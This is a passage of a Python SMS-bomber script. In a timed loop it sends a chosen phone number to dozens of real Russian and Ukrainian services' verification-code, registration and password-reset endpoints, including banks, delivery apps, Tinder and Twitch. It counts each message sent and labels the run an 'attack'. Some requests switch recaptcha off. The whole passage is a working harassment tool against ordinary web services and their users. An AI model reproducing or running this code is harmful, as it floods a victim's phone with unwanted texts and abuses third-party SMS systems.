            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            R = R + 1
            print('[+] RuTaxi Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Was sent!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post(
                'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                        'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.carsmile.com/",
                          json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            R = R + 1
            print('[+] carsmile Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                          json={'phone': '+' + self.formatted_phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
